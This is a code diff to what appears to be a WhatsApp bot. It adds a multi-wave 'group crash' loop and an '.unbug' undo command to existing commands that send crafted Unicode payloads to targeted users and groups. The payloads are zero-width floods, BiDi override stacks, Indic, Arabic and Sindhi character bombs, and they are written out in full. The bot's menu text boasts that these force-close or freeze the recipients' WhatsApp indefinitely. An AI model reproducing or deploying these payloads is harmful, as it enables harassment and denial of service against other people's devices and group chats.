@@ -48,6 +48,9 @@ const savedGroupLinks = {};
 // Bug crash message keys for undo: { groupJid: [msgKey, ...] }
 const groupCrashKeys = {};
 
+// Personal bug message keys for undo: { userJid: [msgKey, ...] }
+const userCrashKeys = {};
+
 // --- WARNS ---
 const WARNS_FILE = path.join(__dirname, "warns.json");
 function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
@@ -596,6 +599,7 @@ function getMenuSections() {
             ['.forceclose @user'], ['.invisfreeze @user'],
             ['.androidbug @user'], ['.iosbug @user'],
             ['.delaybug @user'], ['.nuke @user'],
+            ['.unbug @user'],
             ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
             ['.ungroupcrash ‹groupId›'],
             ['.lockedbypass ‹text›'],
@@ -2498,7 +2502,8 @@ async function handleMessage(sock, msg) {
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `  🤖  *.androidbug @user* — Overloads Android text renderer\n` +
                     `  🍎  *.iosbug @user* — Sindhi/Arabic crash for iOS WA\n` +
-                    `  ⏳  *.delaybug @user* — Freezes chat scroll (unicode wall)\n\n` +
+                    `  ⏳  *.delaybug @user* — Freezes chat scroll (unicode wall)\n` +
+                    `  🔧  *.unbug @user* — *UNDO* — removes all bugs from user\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `💣 *CRASH & NUKE* (1-2 msgs each)\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -2506,11 +2511,12 @@ async function handleMessage(sock, msg) {
                     `  🧊  *.freeze @user* — Pure zero-width flood\n` +
                     `  💀  *.forceclose @user* — Force WA to fully close\n` +
                     `  👁️  *.invisfreeze @user* — Invisible msg, WA freezes silently\n` +
-                    `  ☢️  *.nuke @user* — Combined crash in 2 waves\n\n` +
+                    `  ☢️  *.nuke @user* — Combined crash in 2 waves\n` +
+                    `  🔧  *.unbug @user* — *UNDO ALL* — clears crash, freeze, forceclose, android, iOS, delay\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `🏘️ *GROUP BUGS*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `  💣  *.groupcrash* — Crash all members (run in group)\n` +
+                    `  💣  *.groupcrash* — 5-wave crash loop (run in group)\n` +
                     `  💣  *.groupcrash <id/link>* — Target by ID or invite link\n` +
                     `  🔧  *.ungroupcrash <id>* — *UNDO* — restore group to normal\n` +
                     `  🔓  *.lockedbypass <text>* — Try to msg in admin-only group\n\n` +
@@ -2696,8 +2702,10 @@ async function handleMessage(sock, msg) {
                     const tam = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
                     const zwj  = "\u200D\u200C\u200B".repeat(800);
                     const androidPayload = tel + zwj + kan + zwj + tam + zwj + "\uD83D\uDCA5".repeat(300);
-                    await sock.sendMessage(andTarget, { text: androidPayload });
-                    await reply(`✅ Android bug sent to @${andTarget.split("@")[0]}! — *1 crash message delivered.*`);
+                    const andSent = await sock.sendMessage(andTarget, { text: androidPayload });
+                    if (!userCrashKeys[andTarget]) userCrashKeys[andTarget] = [];
+                    userCrashKeys[andTarget].push(andSent.key);
+                    await reply(`✅ Android bug sent to @${andTarget.split("@")[0]}! — *1 crash message delivered.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2715,8 +2723,10 @@ async function handleMessage(sock, msg) {
                     const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
                     const feff    = "\uFEFF".repeat(600);
                     const iosPayload = sindhi + arabPF + bidi + feff;
-                    await sock.sendMessage(iosTarget, { text: iosPayload });
-                    await reply(`✅ iOS bug sent to @${iosTarget.split("@")[0]}! — *1 crash message delivered.*`);
+                    const iosSent = await sock.sendMessage(iosTarget, { text: iosPayload });
+                    if (!userCrashKeys[iosTarget]) userCrashKeys[iosTarget] = [];
+                    userCrashKeys[iosTarget].push(iosSent.key);
+                    await reply(`✅ iOS bug sent to @${iosTarget.split("@")[0]}! — *1 crash message delivered.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2735,8 +2745,10 @@ async function handleMessage(sock, msg) {
                     const iso       = "\u2066\u2067\u2068\u2069".repeat(600);
                     const bangBang  = "\uFDFD".repeat(400);
                     const fcPayload = zwChain + rtlStack + arabic + iso + bangBang + zwChain;
-                    await sock.sendMessage(fcTarget, { text: fcPayload });
-                    await reply(`✅ Force close bug sent to @${fcTarget.split("@")[0]}! — *WA will crash when they open that chat.*`);
+                    const fcSent = await sock.sendMessage(fcTarget, { text: fcPayload });
+                    if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
+                    userCrashKeys[fcTarget].push(fcSent.key);
+                    await reply(`✅ Force close bug sent to @${fcTarget.split("@")[0]}! — *WA will crash when they open that chat.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2754,8 +2766,10 @@ async function handleMessage(sock, msg) {
                     const wave    = "〰".repeat(2000);
                     const block   = "▓".repeat(2000);
                     const delayPayload = hLine + "\n" + emojiW + "\n" + wave + "\n" + block;
-                    await sock.sendMessage(delayTarget, { text: delayPayload });
-                    await reply(`✅ Delay bug sent to @${delayTarget.split("@")[0]}! — *Chat will freeze/lag on their end.*`);
+                    const delaySent = await sock.sendMessage(delayTarget, { text: delayPayload });
+                    if (!userCrashKeys[delayTarget]) userCrashKeys[delayTarget] = [];
+                    userCrashKeys[delayTarget].push(delaySent.key);
+                    await reply(`✅ Delay bug sent to @${delayTarget.split("@")[0]}! — *Chat will freeze/lag on their end.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2772,8 +2786,10 @@ async function handleMessage(sock, msg) {
                     const rtl     = "\u202e".repeat(500);
                     const arabic  = "\u0647".repeat(600) + "\u0600".repeat(400);
                     const crashPayload = zw + rtl + arabic + zw;
-                    await sock.sendMessage(crashTarget, { text: crashPayload });
-                    await reply(`✅ Crash bug sent to @${crashTarget.split("@")[0]}! — *1 message delivered.*`);
+                    const crashSent = await sock.sendMessage(crashTarget, { text: crashPayload });
+                    if (!userCrashKeys[crashTarget]) userCrashKeys[crashTarget] = [];
+                    userCrashKeys[crashTarget].push(crashSent.key);
+                    await reply(`✅ Crash bug sent to @${crashTarget.split("@")[0]}! — *1 message delivered.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2788,8 +2804,10 @@ async function handleMessage(sock, msg) {
                 try {
                     const zwSet = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
                     const freezePayload = zwSet.repeat(1800);
-                    await sock.sendMessage(freezeTarget, { text: freezePayload });
-                    await reply(`✅ Freeze bug sent to @${freezeTarget.split("@")[0]}! — *1 message delivered.*`);
+                    const freezeSent = await sock.sendMessage(freezeTarget, { text: freezePayload });
+                    if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
+                    userCrashKeys[freezeTarget].push(freezeSent.key);
+                    await reply(`✅ Freeze bug sent to @${freezeTarget.split("@")[0]}! — *1 message delivered.*\n_Use .unbug @user to undo._`);
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
@@ -2823,22 +2841,67 @@ async function handleMessage(sock, msg) {
                     return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                 }
                 const gcName = groupNames[gcTarget] || gcTarget;
-                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_Anyone who opens this group will have WhatsApp force-close until you run .ungroupcrash_`);
+                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_Sending multiple crash waves — anyone who opens this group will have WhatsApp crash. The loop continues every time they reopen._`);
                 try {
+                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
+
+                    // Wave 1: Zero-width flood + Telugu/Kannada/Tamil (Android renderer overload)
                     const zw     = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(1000);
                     const tel    = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
-                    const sindhi = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
-                    const bidi   = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
-                    const rtl    = "\u202e".repeat(500);
-                    const payload = zw + tel + sindhi + bidi + rtl + zw;
-                    const sent = await sock.sendMessage(gcTarget, { text: payload });
-                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
-                    groupCrashKeys[gcTarget].push(sent.key);
+                    const kan    = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
+                    const tam    = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
+                    const wave1  = zw + tel + kan + tam + zw;
+                    const s1 = await sock.sendMessage(gcTarget, { text: wave1 });
+                    groupCrashKeys[gcTarget].push(s1.key);
+                    await delay(600);
+
+                    // Wave 2: Sindhi/Arabic + BiDi overrides (iOS + universal crash)
+                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(700);
+                    const arabPF  = "\uFDFD\uFDFC\uFDFB".repeat(500);
+                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(600);
+                    const feff    = "\uFEFF".repeat(700);
+                    const wave2   = sindhi + arabPF + bidi + feff;
+                    const s2 = await sock.sendMessage(gcTarget, { text: wave2 });
+                    groupCrashKeys[gcTarget].push(s2.key);
+                    await delay(600);
+
+                    // Wave 3: RTL stack + Arabic bomb (RTL renderer crash)
+                    const rtl     = "\u202e".repeat(800);
+                    const rtlStack = "\u202E\u202D\u202C\u202B\u202A".repeat(800);
+                    const arabic  = "\u0647".repeat(700) + "\u0600".repeat(500);
+                    const wave3   = zw + rtl + rtlStack + arabic + zw;
+                    const s3 = await sock.sendMessage(gcTarget, { text: wave3 });
+                    groupCrashKeys[gcTarget].push(s3.key);
+                    await delay(600);
+
+                    // Wave 4: Force-close payload (ZWJ chain + isolation marks)
+                    const zwChain  = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1500);
+                    const iso      = "\u2066\u2067\u2068\u2069".repeat(600);
+                    const bangBang = "\uFDFD".repeat(500);
+                    const wave4    = zwChain + rtlStack + arabic + iso + bangBang + zwChain;
+                    const s4 = await sock.sendMessage(gcTarget, { text: wave4 });
+                    groupCrashKeys[gcTarget].push(s4.key);
+                    await delay(600);
+
+                    // Wave 5: Pure zero-width flood (freeze layer on top of crash)
+                    const zwSet   = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
+                    const wave5   = zwSet.repeat(2000);
+                    const s5 = await sock.sendMessage(gcTarget, { text: wave5 });
+                    groupCrashKeys[gcTarget].push(s5.key);
+
                     await reply(
-                        `✅ *Group crash active on "${gcName}"!*\n\n` +
-                        `☠️ Every member's WhatsApp will force-close when they open this group.\n` +
-                        `They have to swipe-close WA and reopen — but if they open the group again, it crashes again.\n\n` +
-                        `To restore the group, run:\n*.ungroupcrash ${gcTarget}*`
+                        `✅ *Group crash ACTIVE on "${gcName}"!*\n\n` +
+                        `☠️ *5 crash waves deployed:*\n` +
+                        `  🤖 Android renderer overload\n` +
+                        `  🍎 iOS/Sindhi Arabic crash\n` +
+                        `  ↩️ RTL stack crash\n` +
+                        `  💀 Force-close payload\n` +
+                        `  🧊 Zero-width freeze layer\n\n` +
+                        `🔁 *Loop effect:* Anyone who opens the group → WhatsApp crashes.\n` +
+                        `They swipe it away → WA returns to normal.\n` +
+                        `They open the group again → crashes again.\n` +
+                        `This loop continues indefinitely until you undo it.\n\n` +
+                        `To restore the group:\n*.ungroupcrash ${gcTarget}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
@@ -2866,6 +2929,29 @@ async function handleMessage(sock, msg) {
                 }
                 delete groupCrashKeys[ugcTarget];
                 await reply(`✅ *Group restored!* Deleted ${deleted} crash message(s) from *${ugcName}*.\n\nMembers can now open the group normally.`);
+                break;
+            }
+
+            // ─── UNBUG USER ───
+            // Deletes all crash messages sent to a user — unbugs them regardless of bug type.
+            case ".unbug": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const unbugMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const unbugTarget = unbugMentioned[0];
+                if (!unbugTarget) return reply("Usage: .unbug @user\n\nMention the user you want to unbug.");
+                const unbugKeys = userCrashKeys[unbugTarget];
+                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ No stored bug messages found for @${unbugTarget.split("@")[0]}.\n\nThe bot may have restarted since the bug was sent.`);
+                await reply(`🔧 Unbugging @${unbugTarget.split("@")[0]}...`);
+                let unbugDeleted = 0;
+                for (const k of unbugKeys) {
+                    try {
+                        await sock.sendMessage(k.remoteJid || unbugTarget, { delete: k });
+                        unbugDeleted++;
+                        await delay(400);
+                    } catch (_) {}
+                }
+                delete userCrashKeys[unbugTarget];
+                await reply(`✅ *Unbugged @${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\nWorks for: android bug, iOS bug, crash, freeze, force close, delay bug — all types cleared.`);
                 break;
             }
 
